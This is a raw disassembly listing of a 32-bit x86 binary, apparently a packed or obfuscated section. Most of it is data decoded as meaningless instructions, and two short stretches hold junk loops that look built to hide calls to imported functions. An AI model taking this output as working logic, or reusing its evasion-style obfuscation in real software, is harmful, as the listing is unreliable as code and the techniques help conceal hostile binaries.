  4059e7:	outs   dx,BYTE PTR ds:[esi]
  4059e8:	adc    al,dh
  4059ea:	adc    ah,BYTE PTR [esi+0x1c12caf5]
  4059f0:	test   eax,0x516729c2
  4059f5:	mov    al,0xf4
  4059f7:	pop    esp
  4059f8:	test   esp,edi
  4059fa:	fucomp st(1)
  4059fc:	push   ds
  4059fd:	jne    0x405a2e
  4059ff:	jp     0x405a64
  405a01:	sbb    BYTE PTR [edx+0x31ba839b],ah
  405a07:	fwait
  405a08:	leave  
  405a09:	push   ss
  405a0a:	pop    es
  405a0b:	outs   dx,DWORD PTR ds:[esi]
  405a0c:	and    ch,BYTE PTR [ebp+0x53a6cd57]
  405a12:	imul   esi,DWORD PTR [ebp+0x50],0x11bd8246
  405a19:	je     0x38390518
  405a1f:	in     al,0x9a
  405a21:	dec    edx
  405a22:	xor    BYTE PTR fs:[edx],dh
  405a25:	or     cl,dl
  405a27:	and    esp,eax
  405a29:	push   esi
  405a2a:	shr    BYTE PTR [ebx+0x4a],cl
  405a2d:	jb     0x405a3b
  405a2f:	fild   WORD PTR [ecx-0x7]
  405a32:	sub    al,0xc1
  405a34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a35:	repnz iret 
  405a37:	fsubr  QWORD PTR es:[edx-0x7f]
  405a3b:	xchg   ecx,eax
  405a3c:	cmp    ebx,esi
  405a3e:	(bad)  
  405a3f:	mov    al,ds:0x223b133
  405a44:	retf   
  405a45:	pop    ss
  405a46:	outs   dx,DWORD PTR ds:[esi]
  405a47:	int    0x64
  405a49:	call   0x6b10:0xeaaac0a9
  405a50:	xchg   ecx,ebp
  405a52:	div    BYTE PTR [edx]
  405a54:	das    
  405a55:	or     ebx,DWORD PTR [ecx+0x1f0e6047]
  405a5b:	jecxz  0x405a2e
  405a5d:	cs dec esp
  405a5f:	mov    BYTE PTR [edx+0x4ea0408c],0xbd
  405a66:	mov    edi,gs
  405a68:	data16 adc BYTE PTR [edx-0x61a5beda],0x11
  405a70:	sbb    esp,edi
  405a72:	outs   dx,DWORD PTR ds:[esi]
  405a73:	aad    0x5e
  405a75:	adc    esp,DWORD PTR [eax+0x34]
  405a78:	shr    BYTE PTR [eax],1
  405a7a:	sub    al,0xc1
  405a7c:	xor    al,0x8
  405a7e:	xor    al,BYTE PTR [ebx+0x2291c389]
  405a84:	sub    bh,ah
  405a86:	pop    ebp
  405a87:	xchg   ebp,eax
  405a88:	(bad)  
  405a89:	mov    al,0xa7
  405a8b:	call   0x4486535e
  405a90:	cs xchg edx,eax
  405a92:	inc    ebp
  405a93:	in     eax,0x23
  405a95:	inc    ebp
  405a96:	xchg   ebp,eax
  405a97:	and    ah,BYTE PTR [edx+0x21d20945]
  405a9d:	xor    DWORD PTR [eax+0x20],ebx
  405aa0:	fidivr DWORD PTR [ebp-0x68]
  405aa3:	mov    esi,0x50f7f73c
  405aa8:	outs   dx,BYTE PTR ds:[esi]
  405aa9:	fwait
  405aaa:	mov    ebp,0xd708bc0c
  405aaf:	push   cs
  405ab0:	jmp    0xae1a4165
  405ab5:	mov    edi,0x59f7e82a
  405aba:	push   ebp
  405abb:	jb     0x405adb
  405abd:	scas   eax,DWORD PTR es:[edi]
  405abe:	mov    edx,0xe1ccfc71
  405ac3:	inc    edx
  405ac4:	js     0x405b41
  405ac6:	test   BYTE PTR [eax-0x1a],ah
  405ac9:	outs   dx,DWORD PTR ds:[esi]
  405aca:	mov    al,0x39
  405acc:	gs jns 0x405a90
  405acf:	inc    esp
  405ad0:	mov    ds:0xad000cb1,al
  405ad5:	mov    ecx,ecx
  405ad7:	jo     0x405b10
  405ad9:	mov    ebx,0x5efc0a6e
  405ade:	cld    
  405adf:	out    0xcc,al
  405ae1:	adc    esi,ebp
  405ae3:	jle    0x405b11
  405ae5:	xor    bl,BYTE PTR [ebp-0x3a]
  405ae8:	test   al,0xaa
  405aea:	push   edi
  405aeb:	jecxz  0x405b21
  405aed:	repnz fsubr QWORD PTR ds:0xd99bda4b
  405af4:	ss fdivr st(2),st
  405af7:	cdq    
  405af8:	mov    ?,WORD PTR [eax+0x7d]
  405afb:	sti    
  405afc:	nop
  405afd:	push   edx
  405afe:	sbb    esi,DWORD PTR [ecx+0x4d892512]
  405b04:	mov    eax,0x67698100
  405b09:	fidivr DWORD PTR [edx-0x67ff53df]
  405b0f:	pop    esp
  405b10:	test   BYTE PTR [edx+0x12efca6b],cl
  405b16:	xchg   edx,eax
  405b17:	sub    DWORD PTR [edx+0x2a],eax
  405b1a:	jl     0x405b64
  405b1c:	adc    eax,0xdd089914
  405b21:	pop    esi
  405b22:	enter  0xcc5b,0x7e
  405b26:	sub    dl,BYTE PTR [ebp+ecx*2+0x2554310c]
  405b2d:	cdq    
  405b2e:	gs icebp 
  405b30:	pop    ss
  405b31:	stos   BYTE PTR es:[edi],al
  405b32:	mov    eax,0x668047c7
  405b37:	sub    BYTE PTR [ebx],ch
  405b39:	(bad)  [edi-0x44b3d96c]
  405b3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b40:	ds stos DWORD PTR es:[edi],eax
  405b42:	aas    
  405b43:	fsubr  DWORD PTR [esi]
  405b45:	jmp    DWORD PTR [esi+0x7891c614]
  405b4b:	test   al,0x9b
  405b4d:	mov    ebx,0xa68f2312
  405b52:	into   
  405b53:	inc    esi
  405b54:	jns    0x405bb4
  405b56:	fisttp WORD PTR [ecx]
  405b58:	nop
  405b59:	cmc    
  405b5a:	inc    eax
  405b5b:	(bad)  
  405b5c:	iret   
  405b5d:	clc    
  405b5e:	cmp    BYTE PTR [esi-0x398571bd],dl
  405b64:	out    dx,eax
  405b65:	loopne 0x405b4f
  405b67:	fadd   DWORD PTR [esi-0x6bb62b94]
  405b6d:	sub    bh,BYTE PTR [ecx]
  405b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b70:	arpl   WORD PTR [eax+eax*1+0x1023b6d3],si
  405b77:	addr16 cmp al,0xa6
  405b7a:	pop    ss
  405b7b:	hlt    
  405b7c:	ficomp DWORD PTR [edx+esi*4]
  405b7f:	or     DWORD PTR [ecx-0x3ff713d8],edx
  405b85:	aam    0xde
  405b87:	push   0x52689bb7
  405b8c:	mov    edi,fs
  405b8e:	jnp    0x405ba1
  405b90:	xor    al,BYTE PTR [esi]
  405b92:	push   edx
  405b93:	add    al,0x36
  405b95:	pop    ebx
  405b96:	(bad)
  405b99:	into   
  405b9a:	mov    esp,0x4236e98e
  405b9f:	push   ss
  405ba0:	xor    WORD PTR [edi],ax
  405ba3:	cmp    al,0xfe
  405ba5:	test   al,0x9b
  405ba7:	mov    dl,0xdd
  405ba9:	test   BYTE PTR [eax+ebp*8],ch
  405bac:	cdq    
  405bad:	jge    0x405c13
  405baf:	ins    BYTE PTR es:[edi],dx
  405bb0:	jne    0x405b36
  405bb2:	dec    dh
  405bb4:	fisubr WORD PTR [ebp-0x7b8e8aaa]
  405bba:	mov    al,0xe2
  405bbc:	push   0xa9a69484
  405bc1:	aas    
  405bc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bc3:	xor    DWORD PTR [ecx-0x76],edx
  405bc6:	push   0xffffff97
  405bc8:	mov    eax,0x32acc5f
  405bcd:	(bad)  
  405bce:	and    cl,BYTE PTR [edi+0x1232f0e4]
  405bd4:	pop    ds
  405bd5:	retf   
  405bd6:	ror    DWORD PTR [ecx-0x19],1
  405bd9:	jmp    0x405c38
  405bdb:	aam    0x4f
  405bdd:	iret   
  405bde:	xor    eax,0xa9531776
  405be3:	pop    ds
  405be4:	dec    edx
  405be5:	xor    BYTE PTR ds:0x8607,dl
  405bea:	fsub   QWORD PTR [edx-0xe9a4601]
  405bf0:	xchg   esi,eax
  405bf1:	loopne 0x405b73
  405bf3:	inc    ebx
  405bf4:	ret    0x88bb
  405bf7:	addr16 sti 
  405bf9:	sti    
  405bfa:	fld    QWORD PTR [ebx+0x6454d369]
  405c00:	ss loopne 0x405c54
  405c03:	pop    ebp
  405c04:	popa   
  405c05:	push   edx
  405c06:	cdq    
  405c07:	cmp    BYTE PTR [edx],0xed
  405c0a:	xor    eax,0xbf25508d
  405c0f:	pop    ss
  405c10:	push   ebx
  405c11:	pop    ebp
  405c12:	iret   
  405c13:	retf   
  405c14:	sub    esp,DWORD PTR [edi+0x2c]
  405c17:	ds mov ch,0x3e
  405c1a:	push   edi
  405c1b:	mov    ds:0x3748e731,eax
  405c20:	add    al,0xba
  405c22:	sbb    al,0x89
  405c24:	inc    esi
  405c25:	jae    0x405bff
  405c27:	fild   QWORD PTR [ebx]
  405c29:	cdq    
  405c2a:	nop
  405c2b:	push   0xffffffd3
  405c2d:	mov    WORD PTR [ebx+0x29],ds
  405c30:	ins    BYTE PTR es:[edi],dx
  405c31:	std    
  405c32:	arpl   WORD PTR [ecx],bp
  405c34:	popf   
  405c35:	mov    ecx,0x1a8524b8
  405c3a:	xor    BYTE PTR [edi+0x1b],ah
  405c3d:	sbb    bx,si
  405c40:	xchg   DWORD PTR [ebx*1+0x70409dae],esp
  405c47:	ret    
  405c48:	or     al,ch
  405c4a:	push   ecx
  405c4b:	loopne 0x405c3e
  405c4d:	push   0x78
  405c4f:	inc    ebx
  405c50:	adc    ebx,DWORD PTR [edi+0x5e1e02f9]
  405c56:	mov    edx,0x31df861e
  405c5b:	loopne 0x405bea
  405c5d:	fs mov ebp,0x61cec78e
  405c63:	stos   DWORD PTR es:[edi],eax
  405c64:	scas   al,BYTE PTR es:[edi]
  405c65:	dec    edi
  405c66:	std    
  405c67:	push   cs
  405c68:	dec    ebx
  405c69:	cld    
  405c6a:	inc    ecx
  405c6b:	push   ecx
  405c6c:	sahf   
  405c6d:	mov    ch,0x5a
  405c6f:	push   ecx
  405c70:	fidivr WORD PTR [ebx-0x77a8f787]
  405c76:	mov    edx,0x2ec0e4fd
  405c7b:	dec    edx
  405c7c:	jmp    0x85795552
  405c81:	and    al,0x70
  405c83:	push   ds
  405c84:	pop    esp
  405c85:	ss pop edi
  405c87:	jmp    0x405c54
  405c89:	sbb    BYTE PTR [eax-0x64],dl
  405c8c:	jmp    0xec848be3
  405c91:	lods   al,BYTE PTR ds:[esi]
  405c92:	dec    esi
  405c93:	imul   BYTE PTR ds:0xf4de3392
  405c99:	push   cs
  405c9a:	adc    DWORD PTR ds:0x1e9effa3,ebp
  405ca0:	and    BYTE PTR [edi-0x2c],dl
  405ca3:	pop    ebx
  405ca4:	xor    BYTE PTR [ebx],dh
  405ca6:	div    edx
  405ca8:	inc    eax
  405ca9:	dec    ecx
  405caa:	jbe    0x405d0e
  405cac:	test   DWORD PTR [ebx*2-0x38f6e786],0xcb4fd40b
  405cb7:	pop    eax
  405cb8:	push   ss
  405cb9:	xchg   edx,eax
  405cba:	mov    cs,WORD PTR [ebp-0x2]
  405cbd:	push   ebp
  405cbe:	sbb    ecx,0xfffffff4
  405cc1:	push   edi
  405cc2:	ins    DWORD PTR es:[edi],dx
  405cc3:	bound  eax,QWORD PTR [eax+ebx*4+0x3b145d54]
  405cca:	enter  0x850f,0x12
  405cce:	add    al,0x0
  405cd0:	add    BYTE PTR [ecx],al
  405cd2:	adc    eax,0x4346bf
  405cd7:	mov    ax,WORD PTR [ebp-0x8]
  405cdb:	and    DWORD PTR ds:0x4346d3,0x4346fb
  405ce5:	mov    ecx,0x8a38
  405cea:	sub    DWORD PTR ds:0x43478f,0x30d0
  405cf4:	xor    ax,cx
  405cf7:	or     ecx,0x3ba0
  405cfd:	mov    ecx,0x3afe
  405d02:	and    DWORD PTR ds:0x434747,0x6a78
  405d0c:	add    ax,cx
  405d0f:	mov    DWORD PTR ds:0x4346c7,0x12
  405d19:	cmp    DWORD PTR ds:0x4346c7,0x0
  405d20:	je     0x405d51
  405d26:	cmp    DWORD PTR ds:0x4346c7,0x13
  405d2d:	jne    0x405d3f
  405d33:	push   DWORD PTR [ebp-0x1c]
  405d36:	push   DWORD PTR [ebp-0x10]
  405d39:	call   DWORD PTR ds:0x413284
  405d3f:	mov    ecx,DWORD PTR ds:0x4346c7
  405d45:	dec    ecx
  405d46:	mov    DWORD PTR ds:0x4346c7,ecx
  405d4c:	jmp    0x405d19
  405d51:	mov    ecx,DWORD PTR [ebp+0x8]
  405d54:	movzx  eax,ax
  405d57:	not    eax
  405d59:	and    eax,DWORD PTR [ecx]
  405d5b:	mov    ecx,DWORD PTR [ebp+0x8]
  405d5e:	mov    DWORD PTR [ecx],eax
  405d60:	jmp    0x405d6c
  405d65:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  405d6c:	mov    ax,WORD PTR [ebp-0x8]
  405d70:	push   DWORD PTR [ebp+0x8]
  405d73:	call   0x4060e7
  405d78:	test   eax,eax
  405d7a:	jmp    0x4060dd
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	jb     0x405db6
  405d82:	push   ebp
  405d83:	cld    
  405d84:	pop    ebp
  405d85:	gs jae 0x405d28
  405d88:	call   0x5111bd6
  405d8d:	mov    ebx,0x7e3cb5df
  405d92:	jle    0x405d58
  405d94:	jns    0x405e14
  405d96:	jle    0x405d85
  405d98:	test   edi,ecx
  405d9a:	mov    ch,0xb0
  405d9c:	ret    0x1d41
  405d9f:	pushf  
  405da0:	aam    0xd
  405da2:	pop    ds
  405da3:	dec    esp
  405da4:	aad    0x65
  405da6:	ss clc 
  405da8:	imul   edx,esp,0x38ebc5bb
  405dae:	ins    DWORD PTR es:[edi],dx
  405daf:	mov    edi,0x50f447f5
  405db4:	mov    fs,WORD PTR [edi+0x6eb559d6]
  405dba:	or     edi,eax
  405dbc:	inc    ebx
  405dbd:	gs cmp eax,0x3f3284d2
  405dc3:	add    eax,0xe6af58ad
  405dc8:	sub    edx,ebx
  405dca:	xor    al,0xc5
  405dcc:	push   ecx
  405dcd:	sub    al,0x2a
  405dcf:	hlt    
  405dd0:	mov    WORD PTR [edi-0x659eefcb],?
  405dd6:	add    DWORD PTR [ecx+0x5f3beb98],0x996c6085
  405de0:	mov    ecx,edx
  405de2:	in     al,dx
  405de3:	mov    ds:0x1eddbbfc,eax
  405de8:	sub    dh,BYTE PTR [edi]
  405dea:	(bad)  
  405deb:	leave  
  405dec:	js     0x405dc0
  405dee:	or     DWORD PTR [ebp+eiz*8-0x46],edx
  405df2:	cmp    eax,0x2ca44ea4
  405df7:	test   ch,0xf8
  405dfa:	inc    ebp
  405dfb:	sbb    ah,BYTE PTR [eax+0x67]
  405dfe:	fsubr  st(0),st
  405e00:	out    dx,al
  405e01:	dec    eax
  405e02:	xlat   BYTE PTR ds:[ebx]
  405e03:	icebp  
  405e04:	and    edx,edx
  405e06:	cmp    ah,BYTE PTR [edi+edx*2-0x2fbc5b38]
  405e0d:	aam    0x84
  405e0f:	(bad)  [edx-0x301b60ac]
  405e15:	test   DWORD PTR [esi],eax
  405e17:	jmp    0x2c64628b
  405e1c:	jno    0x405e5d
  405e1e:	aaa    
  405e1f:	xchg   ebp,eax
  405e20:	fwait
  405e21:	push   ebx
  405e22:	in     al,dx
  405e23:	sti    
  405e24:	or     edi,DWORD PTR [ebx]
  405e26:	std    
  405e27:	xchg   edx,eax
  405e28:	outs   dx,BYTE PTR ds:[esi]
  405e29:	je     0x405ea5
  405e2b:	ja     0x405ea2
  405e2d:	icebp  
  405e2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e2f:	jbe    0x405db7
  405e31:	adc    DWORD PTR [ebp+0x5e],0xffffffe7
  405e35:	pop    ebp
  405e36:	sar    BYTE PTR [ecx+0x4c465927],1
  405e3c:	out    0x4d,al
  405e3e:	das    
  405e3f:	xor    eax,DWORD PTR [eax+0x2c]
  405e42:	sbb    BYTE PTR [eax+0x1bc950a0],bh
  405e48:	clc    
  405e49:	cwde   
  405e4a:	and    esp,DWORD PTR [ebp+0x6e6fa0c4]
  405e50:	mov    esp,0xa5e66d25
  405e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e56:	push   eax
  405e57:	cmc    
  405e58:	pushf  
  405e59:	cmp    BYTE PTR [ebx-0x47],cl
  405e5c:	jo     0x405ec5
  405e5e:	xchg   edi,eax
  405e5f:	data16 mov cl,bh
  405e62:	mov    bl,0xb6
  405e64:	mov    BYTE PTR [ebp+ebx*2-0x4ec56852],dl
  405e6b:	inc    ecx
  405e6c:	or     al,0xfa
  405e6e:	pop    ecx
  405e6f:	call   0x60e7:0x35d0280c
  405e76:	cmc    
  405e77:	xlat   BYTE PTR ds:[ebx]
  405e78:	sahf   
  405e79:	mov    WORD PTR [edi],cs
  405e7b:	adc    bl,BYTE PTR [ecx]
  405e7d:	loop   0x405ebe
  405e7f:	shl    BYTE PTR [ebp-0x7a],1
  405e82:	push   edi
  405e83:	jmp    0x405ec6
  405e85:	dec    ebp
  405e86:	ins    DWORD PTR es:[edi],dx
  405e87:	sahf   
  405e88:	inc    eax
  405e89:	xchg   ebp,eax
  405e8a:	fisttp WORD PTR [eax+0x28a018f]
  405e90:	jmp    0x405ed8
  405e92:	bound  edx,QWORD PTR [eax+0x4a36e42d]
  405e98:	retf   0x9c8c
  405e9b:	hlt    
  405e9c:	leave  
  405e9d:	pop    esi
  405e9e:	push   ds
  405e9f:	in     eax,0xaf
  405ea1:	retf   0x6a4c
  405ea4:	ret    0x140a
  405ea7:	ins    DWORD PTR es:[edi],dx
  405ea8:	shl    DWORD PTR [edi],1
  405eaa:	sbb    esp,DWORD PTR [edi+0x4044d8e7]
  405eb0:	xor    esi,DWORD PTR [edi+0x74]
  405eb3:	xchg   DWORD PTR [edi],edx
  405eb5:	xor    DWORD PTR [esi],edx
  405eb7:	mov    DWORD PTR [edx-0x4cb925f6],eax
  405ebd:	mov    eax,gs
  405ebf:	in     al,dx
  405ec0:	or     eax,0x6a14030e
  405ec5:	add    eax,0x99b5d8f2
  405eca:	ds int 0x1d
  405ecd:	push   eax
  405ece:	jmp    0x3ee9:0x54948535
  405ed5:	scas   al,BYTE PTR es:[edi]
  405ed6:	and    DWORD PTR [edx+esi*4+0x1875f068],esi
  405edd:	adc    DWORD PTR [eax],edi
  405edf:	mov    ebp,0x52000988
  405ee4:	fadd   DWORD PTR [edx-0x7788a5f9]
  405eea:	repz or dh,0x98
  405eee:	stc    
  405eef:	stc    
  405ef0:	inc    edx
  405ef1:	cli    
  405ef2:	sbb    DWORD PTR [esi],esi
  405ef4:	out    dx,al
  405ef5:	ret    
  405ef6:	and    eax,0x190c181e
  405efb:	adc    al,0xc7
  405efd:	sbb    DWORD PTR [ecx-0x17],edx
  405f00:	jmp    0x9549a007
  405f05:	jle    0x405f38
  405f07:	mov    edx,DWORD PTR [eax+0x6b]
  405f0a:	call   0xa1f389c0
  405f0f:	in     eax,dx
  405f10:	mov    edx,DWORD PTR [edi-0x24]
  405f13:	pop    ss
  405f14:	fmul   st,st(2)
  405f16:	inc    esi
  405f17:	jbe    0x405f05
  405f19:	(bad)  
  405f1a:	or     al,0x2f
  405f1c:	xchg   ebp,eax
  405f1d:	pop    edi
  405f1e:	or     al,0x70
  405f20:	ficomp WORD PTR [ecx+0x1545d9eb]
  405f26:	sti    
  405f27:	cdq    
  405f28:	push   edi
  405f29:	(bad)  
  405f2a:	push   ds
  405f2b:	dec    esi
  405f2c:	adc    bl,BYTE PTR ds:0x19efc95e
  405f32:	fcmovu st,st(7)
  405f34:	fnsave [edi]
  405f36:	aad    0x39
  405f38:	or     eax,0x55acb56d
  405f3d:	stc    
  405f3e:	pop    ebp
  405f3f:	xchg   DWORD PTR [edi-0x5c2bfc42],esi
  405f45:	mov    al,0xb4
  405f47:	and    cl,BYTE PTR [eax+0x425d38e4]
  405f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f4e:	cs mov ah,0xbe
  405f51:	(bad)
  405f55:	or     ebx,DWORD PTR [esi+ebx*4-0x20]
  405f59:	xchg   esp,edi
  405f5b:	adc    DWORD PTR [ebp+0x1],esp
  405f5e:	pop    ebp
  405f5f:	shl    bh,cl
  405f61:	loope  0x405f79
  405f63:	sahf   
  405f64:	or     al,0x2
  405f66:	mov    edx,0xa8628066
  405f6b:	mov    ebp,0x3c72a6a8
  405f70:	mov    dh,0x80
  405f72:	aad    0xa
  405f74:	xor    DWORD PTR [ecx+0xd],eax
  405f77:	push   eax
  405f78:	pop    ebp
  405f79:	push   ss
  405f7a:	push   DWORD PTR [edi+0x1dd8729b]
  405f80:	jmp    0xd462:0x50c08a8e
  405f87:	sub    ebp,DWORD PTR [eax+0x9d4f9b4]
  405f8d:	into   
  405f8e:	outs   dx,DWORD PTR ds:[esi]
  405f8f:	lahf   
  405f90:	fs in  al,dx
  405f92:	cwde   
  405f93:	and    bl,BYTE PTR [eax+0x62]
  405f96:	mov    al,0x80
  405f98:	add    DWORD PTR [ebp+0x70],eax
  405f9b:	mov    edx,0xab8f2f41
  405fa0:	xchg   esp,eax
  405fa1:	pop    ebx
  405fa2:	and    DWORD PTR [ecx+edi*1+0x38],eax
  405fa6:	jae    0x405fd8
  405fa8:	jb     0x406017
  405faa:	test   al,0x8a
  405fac:	sbb    BYTE PTR [ecx+0x27],dl
  405faf:	jecxz  0x405f56
  405fb1:	fucomp st(3)
  405fb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fb4:	enter  0x8e36,0xb
  405fb8:	(bad)  
  405fb9:	in     al,0xd3
  405fbb:	popf   
  405fbc:	shl    BYTE PTR [edx-0x672d3610],0x7e
  405fc3:	and    eax,0xf5d68267
  405fc8:	int    0xc7
  405fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fcb:	mov    esi,0xf58d25cc
  405fd0:	maxps  xmm6,XMMWORD PTR [ecx]
  405fd3:	add    al,0x42
  405fd5:	lea    ebp,[edx+esi*8+0x37]
  405fd9:	xchg   ebx,eax
  405fda:	jl     0x405ff9
  405fdc:	or     eax,0xf48837a5
  405fe1:	outs   dx,BYTE PTR ds:[esi]
  405fe2:	push   es
  405fe3:	sub    DWORD PTR [ecx+edx*2+0x1af91a37],0xfffffffc
  405feb:	jo     0x405fea
  405fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fee:	(bad)  
  405ff0:	fistp  WORD PTR [eax]
  405ff2:	pop    ebx
  405ff3:	jnp    0x406028
  405ff5:	add    BYTE PTR [edi-0x38],al
  405ff8:	mov    cs,WORD PTR [ebx+0xa]
  405ffb:	xchg   ebx,eax
  405ffc:	(bad)  
  405ffd:	pop    ss
  405ffe:	retf   0xe36d
  406001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406002:	test   ah,bl
  406004:	loop   0x405faa
  406006:	fdivr  QWORD PTR [esp+ecx*4]
  406009:	(bad)  
  40600a:	jl     0x406023
  40600c:	sub    dl,bl
  40600e:	cs or  bl,bl
  406011:	dec    eax
  406012:	hlt    
  406013:	sub    BYTE PTR [eax+0x5c4f0898],cl
  406019:	xor    dh,bl
  40601b:	mov    ds:0xab70ce1a,eax
  406020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406021:	enter  0xedb9,0x23
  406025:	mov    bh,0x81
  406027:	adc    BYTE PTR [esi-0x72],0x38
  40602b:	mov    dl,0x1a
  40602d:	loope  0x406068
  40602f:	cli    
  406030:	(bad)  
  406031:	mov    al,0x89
  406033:	dec    edx
  406034:	aam    0x55
  406036:	ror    BYTE PTR [ecx],1
  406038:	fsubr  QWORD PTR [esp+eax*2+0x54]
  40603c:	xchg   ebp,eax
  40603d:	out    0x78,al
  40603f:	jb     0x406096
  406041:	sbb    al,0x9f
  406043:	in     al,0x8d
  406045:	repnz imul edi,DWORD PTR [eax+0x52a071b7],0x296f131a
  406050:	pop    esi
  406051:	dec    esi
  406052:	cmp    BYTE PTR [ecx+eiz*2],ch
  406055:	je     0x406084
  406057:	or     al,0x1a
  406059:	pop    ebx
  40605a:	sbb    DWORD PTR [edi-0x57b8f6d8],esp
  406060:	and    edi,edi
  406062:	int    0x31
  406064:	js     0x406029
  406066:	inc    esp
  406067:	repz sub ebp,DWORD PTR [ecx]
  40606a:	call   FWORD PTR [ecx]
  40606c:	dec    ecx
  40606d:	push   edx
  40606e:	mov    al,ds:0xa4019b0b
  406073:	and    BYTE PTR ds:0xc459a617,0x4f
  40607a:	(bad)  
  40607b:	mov    ax,WORD PTR [ebp-0x2205c42b]
  406082:	outs   dx,DWORD PTR ds:[esi]
  406083:	shl    BYTE PTR [edi-0x26],0x83
  406087:	daa    
  406088:	iret   
  406089:	xor    BYTE PTR [edi-0x1d9e9eb6],cl
  40608f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406090:	cmp    al,0x17
  406092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406093:	xchg   edi,eax
  406094:	add    al,0x9b
  406096:	inc    edx
  406097:	mov    ebp,0x3496dd03
  40609c:	ins    DWORD PTR es:[edi],dx
  40609d:	ret    
  40609e:	xchg   ebp,eax
  40609f:	repz push ds
  4060a1:	cmp    BYTE PTR [edx+0x67],ch
  4060a4:	push   eax
  4060a5:	aam    0xeb
  4060a7:	out    dx,al
  4060a8:	or     DWORD PTR [esi+edi*1-0x6246e8ec],eax
  4060af:	je     0x406121
  4060b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060b2:	div    BYTE PTR [edx-0x2116f098]
  4060b8:	(bad)  
  4060b9:	dec    ecx
  4060ba:	call   0x2ce61a4d
  4060bf:	lahf   
  4060c0:	ret    0x4f13
  4060c3:	pusha  
  4060c4:	fcom   QWORD PTR [edi+0x24]
  4060c7:	push   ds
  4060c8:	cmp    DWORD PTR [edi+0x71ca7374],edi
  4060ce:	out    0xed,eax
  4060d0:	fldenv es:[ebx]
  4060d3:	mov    ds:0xa135c62b,al
  4060d8:	arpl   WORD PTR [eax+0xfc68c44],si
  4060de:	test   BYTE PTR [edx-0x36000004],al
  4060e4:	ret    0x4
  4060e7:	push   ebp
  4060e8:	mov    ebp,esp
  4060ea:	sub    esp,0x2c
  4060ed:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4060f4:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  4060fb:	mov    ecx,DWORD PTR ds:0x4346ef
  406101:	mov    eax,ds:0x43479b
  406106:	sub    eax,ecx
  406108:	add    ecx,DWORD PTR [ecx+eax*1]
  40610b:	mov    eax,0x9577
  406110:	and    DWORD PTR ds:0x4346d3,0x0
  40611a:	jmp    0x40612c
  40611f:	mov    ecx,DWORD PTR ds:0x4346d3
  406125:	inc    ecx
  406126:	mov    DWORD PTR ds:0x4346d3,ecx
  40612c:	cmp    DWORD PTR ds:0x4346d3,0x15
  406133:	jae    0x40615a
  406139:	cmp    DWORD PTR ds:0x4346d3,0x17
  406140:	jne    0x40614f
  406146:	push   DWORD PTR [ebp-0x10]
  406149:	call   DWORD PTR ds:0x4130c0
  40614f:	jmp    0x40611f
  406154:	adc    DWORD PTR ds:0x4346b7,edx
  40615a:	mov    WORD PTR [ebp-0x4],ax
  40615e:	and    DWORD PTR ds:0x4346fb,0x0
  406168:	mov    ecx,DWORD PTR ds:0x4346fb
  40616e:	inc    ecx
  40616f:	mov    DWORD PTR ds:0x4346fb,ecx
  406175:	cmp    DWORD PTR ds:0x4346fb,0x5
  40617c:	jne    0x40618b
  406182:	push   DWORD PTR [ebp-0x10]
  406185:	call   DWORD PTR ds:0x4133fc
  40618b:	cmp    DWORD PTR ds:0x4346fb,0x4
  406192:	jne    0x4061a7
  406198:	xor    ecx,ecx
  40619a:	or     ecx,DWORD PTR ds:0x4346fb
  4061a0:	inc    ecx
  4061a1:	mov    DWORD PTR ds:0x4346fb,ecx
  4061a7:	cmp    DWORD PTR ds:0x4346fb,0x1f
  4061ae:	jb     0x406168
  4061b4:	jmp    0x4065a2
  4061b9:	and    bl,al
  4061bb:	ss cmp ch,bh
  4061be:	cmc    
  4061bf:	lock jecxz 0x406145
  4061c2:	sahf   
  4061c3:	rol    ebp,1
  4061c5:	outs   dx,BYTE PTR ds:[esi]
  4061c6:	jp     0x406214
  4061c8:	and    DWORD PTR [ebx+0x3f],esi
  4061cb:	jle    0x40624b
  4061cd:	dec    edi
  4061ce:	jns    0x40624e
  4061d0:	jle    0x406250
  4061d2:	mov    eax,ds:0xc70cdeac
  4061d7:	or     ah,bh
  4061d9:	xor    al,0x19
  4061db:	mov    ds:0x13a263f0,eax
  4061e0:	add    DWORD PTR [esi+0x4c],0xdbc3b119
  4061e7:	aad    0x45
  4061e9:	mov    esp,DWORD PTR [esi+eiz*4+0x129d9a11]
  4061f0:	(bad)  
  4061f1:	rcl    DWORD PTR [eax-0xe],cl
  4061f4:	push   esp
  4061f5:	xor    DWORD PTR [ecx+0x31],esp
  4061f8:	sbb    edi,DWORD PTR [eax]
  4061fa:	aaa    
  4061fb:	and    dh,bl
  4061fd:	sub    eax,0x6c454ca
  406202:	cmc    
  406203:	cli    
  406204:	fstp   QWORD PTR [edi-0x1a]
  406207:	mov    ds:0x5ef5ec91,al
  40620c:	out    0xac,eax
  40620e:	sbb    al,BYTE PTR [ecx-0x51]
  406211:	pop    es
  406212:	sbb    al,0xed
  406214:	mov    ah,BYTE PTR [eax+0x6ca5a996]
  40621a:	(bad)  
  40621b:	and    ebx,edx
  40621d:	cmp    DWORD PTR cs:[edx-0x3ec036b9],0xdea6964d
  406228:	or     al,0x2e
  40622a:	sub    eax,0x120d420a
  40622f:	xor    al,0xb9
  406231:	mov    al,0xbd
  406233:	push   edi
  406234:	push   DWORD PTR [eax-0x22]
  406237:	(bad)
  40623a:	jg     0x4062a7
  40623c:	and    edi,DWORD PTR [edx]
  40623e:	push   ebp
  40623f:	inc    bp
  406241:	retf   
